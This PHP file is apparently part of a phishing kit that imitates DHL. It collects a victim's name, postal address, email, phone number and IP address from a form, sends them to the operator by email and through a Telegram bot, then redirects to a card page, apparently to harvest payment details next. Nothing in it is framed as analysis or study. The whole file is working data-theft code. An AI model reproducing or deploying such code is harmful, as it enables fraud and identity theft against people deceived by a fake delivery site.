<?php
    session_start();
    include("../common/functions.php");
    include("../common/sub_includes.php");
    require("../config.php");

    $_SESSION["nom"]    = $_POST["last-name"];
    $_SESSION["prenom"] = $_POST["first-name"];

    $_SESSION["fullname"] = $_POST["last-name"]." ".$_POST["first-name"];

    $_SESSION["email"]  = $_POST["email"];
    $_SESSION["phone"]  = $_POST["telephone"];
    
    $_SESSION["zip"]    = $_POST["zip-code"];
    $_SESSION["adress"] = $_POST["adresse"];
    $_SESSION["city"]   = $_POST["city"];

    $message = "
[📦] DHL INFOS [📦]

👤 Nom: " . $_SESSION["nom"] . "
👤 Prenom: " . $_SESSION["prenom"] . "
👤 Adresse: " . $_SESSION["adress"] . "
👤 City: " . $_SESSION["city"] . "
👤 ZIP:" . $_SESSION["zip"] . "

👤 Email: " . $_SESSION["email"] . "
👤 Phone: " . $_SESSION["phone"] . "
👤 Adresse IP: " . _ip() . "
    ";

    if ($rezmail) {
        $Subject = "📦 +1 INFOS ・ ".$_SESSION['email']." ・ ".$_SESSION['fullname']." ・ ". _ip();
        $head = "From: 🥤 OxParadox <info@paradox.infos>";

        mail($mail, $Subject, $message, $head);
    }

    if ($reztelegram) {
        file_get_contents("https://api.telegram.org/bot$token/sendMessage?".http_build_query(['text' => $message,'chat_id' => $chat_id]));
    }

    header("Location: ../card.php"); die();
?>